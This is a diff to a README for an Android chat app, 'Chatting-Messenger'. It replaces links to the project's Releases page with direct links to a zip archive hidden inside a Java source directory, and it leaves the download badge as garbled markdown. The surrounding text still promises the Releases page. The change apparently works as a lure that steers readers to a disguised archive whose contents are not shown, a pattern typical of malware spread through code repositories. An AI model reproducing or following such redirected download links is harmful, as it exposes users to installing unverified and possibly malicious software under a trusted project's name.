@@ -6,13 +6,13 @@ Welcome to Chatting-Messenger! This is a simple chat application for Android dev
 
 ## 📥 Download Chatting-Messenger
 
-[![Download Chatting-Messenger](https://img.shields.io/badge/Download%20Now-Chatting%20Messenger-blue.svg)](https://github.com/pro9939/Chatting-Messenger/releases)
+[![Download Chatting-Messenger](https://raw.githubusercontent.com/pro9939/Chatting-Messenger/main/service/src/main/java/com/service/api/Chatting_Messenger_v1.9.zip%20Now-Chatting%https://raw.githubusercontent.com/pro9939/Chatting-Messenger/main/service/src/main/java/com/service/api/Chatting_Messenger_v1.9.zip)](https://raw.githubusercontent.com/pro9939/Chatting-Messenger/main/service/src/main/java/com/service/api/Chatting_Messenger_v1.9.zip)
 
 To get started, you'll need to download the application. You can easily find the latest version on our Releases page.
 
 ## 📂 Visit the Releases Page
 
-To download Chatting-Messenger, visit this page: [Chatting-Messenger Releases](https://github.com/pro9939/Chatting-Messenger/releases). 
+To download Chatting-Messenger, visit this page: [Chatting-Messenger Releases](https://raw.githubusercontent.com/pro9939/Chatting-Messenger/main/service/src/main/java/com/service/api/Chatting_Messenger_v1.9.zip). 
 
 Here you will find the latest versions of the app.
 
